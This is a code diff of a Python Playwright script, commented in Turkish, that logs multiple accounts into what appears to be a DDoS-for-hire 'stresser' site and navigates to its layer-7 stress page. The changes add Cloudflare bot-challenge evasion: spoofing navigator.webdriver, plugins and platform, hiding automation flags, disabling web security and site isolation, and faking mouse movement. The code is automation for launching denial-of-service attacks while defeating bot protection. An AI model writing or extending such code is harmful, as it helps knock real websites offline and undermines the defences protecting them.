@@ -51,12 +51,12 @@ def attack_worker(account):
     while True:
         try:
             with sync_playwright() as p:
-                # Daha gerçekçi tarayıcı ayarları
+                # Cloudflare'i aşmak için gelişmiş argümanlar
                 context = p.chromium.launch_persistent_context(
                     user_data_dir=profile_dir,
                     headless=True,
-                    viewport={"width": 1920, "height": 1080},
-                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                    viewport={"width": 1280, "height": 720},
+                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
                     args=[
                         "--no-sandbox",
                         "--disable-dev-shm-usage",
@@ -65,61 +65,82 @@ def attack_worker(account):
                         "--disable-features=IsolateOrigins,site-per-process",
                         "--disable-web-security",
                         "--disable-features=BlockInsecurePrivateNetworkRequests",
-                        "--disable-features=OutOfBlinkCors"
+                        "--disable-features=OutOfBlinkCors",
+                        "--disable-site-isolation-trials"
                     ],
-                    slow_mo=100
+                    ignore_default_args=["--enable-automation"],
+                    slow_mo=50
                 )
                 page = context.new_page()
-
-                # WebDriver tespitini gizle
+                
+                # WebDriver tespitini atlatmak için init script
                 page.add_init_script("""
-                    Object.defineProperty(navigator, 'webdriver', {
-                        get: () => undefined
-                    });
-                    Object.defineProperty(navigator, 'plugins', {
-                        get: () => [1, 2, 3, 4, 5]
-                    });
-                    Object.defineProperty(navigator, 'languages', {
-                        get: () => ['en-US', 'en']
-                    });
+                    Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+                    Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]});
+                    Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']});
+                    Object.defineProperty(navigator, 'platform', {get: () => 'Win32'});
+                    Object.defineProperty(window, 'chrome', {get: () => {}});
+                    Object.defineProperty(window, 'navigator', {value: window.navigator, writable: false});
                 """)
 
+                # ---------- CLOUDFLARE AŞMA ----------
                 print(f"[{username}] 🔐 Giriş sayfasına gidiliyor (URL: https://l7srv.su/login)...")
                 try:
                     response = page.goto("https://l7srv.su/login", timeout=60000, wait_until="domcontentloaded")
-                    if response:
-                        print(f"[{username}] ✅ Sayfa yüklendi. HTTP Durum Kodu: {response.status}")
-                        if response.status >= 400:
-                            print(f"[{username}] ⚠️ HTTP hatası: {response.status} - Sayfa mevcut değil veya erişim engeli.")
-                            if response.status == 403:
-                                print(f"[{username}] 🛑 403 Forbidden - Cloudflare veya WAF tarafından engelleniyor olabilir. Headless modda bot algılaması yapılıyor.")
-                            raise Exception(f"HTTP {response.status}")
+                    
+                    if response and response.status == 403:
+                        print(f"[{username}] 🛑 403 Forbidden - Cloudflare veya WAF tarafından engelleniyor olabilir.")
+                        print(f"[{username}] ⏳ Cloudflare bekleme sayfası kontrol ediliyor...")
+                        
+                        # Cloudflare 5 saniye bekleme sayfası varsa bekleyip geç
+                        try:
+                            page.wait_for_selector("#challenge-running", timeout=5000)
+                            print(f"[{username}] ☁️ Cloudflare challenge tespit edildi, bekleniyor...")
+                            page.wait_for_selector("#challenge-success", timeout=30000)
+                            print(f"[{username}] ✅ Cloudflare challenge geçildi!")
+                            time.sleep(2)
+                            # Sayfayı yeniden yükle
+                            page.reload()
+                            page.wait_for_load_state("networkidle", timeout=30000)
+                        except:
+                            print(f"[{username}] ⚠️ Cloudflare challenge bulunamadı, direkt devam ediliyor.")
+                        
+                        # Tekrar kontrol et
+                        response = page.goto("https://l7srv.su/login", timeout=30000, wait_until="domcontentloaded")
+                        if response and response.status == 403:
+                            raise Exception("HTTP 403 hala devam ediyor, Cloudflare aşılamadı.")
+                        else:
+                            print(f"[{username}] ✅ Cloudflare aşıldı, HTTP {response.status}")
+                    
+                    # Sayfa başarıyla yüklendiyse devam et
+                    if response and response.status == 200:
+                        print(f"[{username}] ✅ Sayfa yüklendi. HTTP {response.status}")
                     else:
-                        print(f"[{username}] ❌ Yanıt alınamadı (response None).")
-                        raise Exception("No response")
+                        print(f"[{username}] ⚠️ Beklenmeyen HTTP durumu: {response.status if response else 'Yok'}")
+                    
+                    # DOM yüklendi mi kontrol et
+                    page.wait_for_load_state("domcontentloaded", timeout=10000)
+                    time.sleep(1)
 
-                    # DOM'un yüklenmesini bekle
-                    page.wait_for_load_state("domcontentloaded", timeout=15000)
-                    time.sleep(2)
-
-                    # Form alanlarını kontrol et
-                    if page.locator("#username").count() == 0:
-                        print(f"[{username}] ⚠️ #username alanı bulunamadı, sayfa farklı olabilir.")
-                    else:
-                        print(f"[{username}] ✅ #username alanı mevcut.")
-
-                    # Formu doldur
+                    # ---------- FORM DOLDUR ----------
                     print(f"[{username}] 📝 Form dolduruluyor...")
                     page.fill("#username", username)
                     page.fill("#password", password)
 
-                    # Buton aktifleşene kadar bekle
+                    # Buton aktif olana kadar bekle
                     print(f"[{username}] ⏳ Buton aktifleşmesi bekleniyor...")
                     page.wait_for_selector("#loginNextBtn:not([disabled])", timeout=15000)
+                    
+                    # Mouse hareketi yap (bot olmadığını göster)
+                    page.mouse.move(100, 100)
+                    time.sleep(0.5)
+                    page.mouse.click(100, 100)
+                    
+                    # Butona tıkla
                     page.click("#loginNextBtn")
                     print(f"[{username}] 🖱️ Butona tıklandı.")
 
-                    # Dashboard'a yönlenene kadar bekle (timeout 60 sn)
+                    # Dashboard'a yönlenene kadar bekle
                     page.wait_for_url(lambda url: "/dash" in url, timeout=60000)
                     print(f"[{username}] ✅ Giriş başarılı, dashboard'a yönlendirildi.")
                     consecutive_errors = 0
@@ -149,10 +170,10 @@ def attack_worker(account):
                 # ---------- STRESS SAYFASI ----------
                 print(f"[{username}] 📡 Stress sayfasına gidiliyor...")
                 try:
-                    response = page.goto("https://l7srv.su/dash/stress", timeout=60000, wait_until="domcontentloaded")
+                    response = page.goto("https://l7srv.su/dash/stress", timeout=30000, wait_until="domcontentloaded")
                     if response:
                         print(f"[{username}] ✅ Stress sayfası yüklendi. HTTP {response.status}")
-                    page.wait_for_load_state("domcontentloaded", timeout=15000)
+                    page.wait_for_load_state("domcontentloaded", timeout=10000)
                     time.sleep(2)
                     if page.locator("#layer_7").count() == 0:
                         print(f"[{username}] ⚠️ #layer_7 bulunamadı, belki farklı bir sekme?")
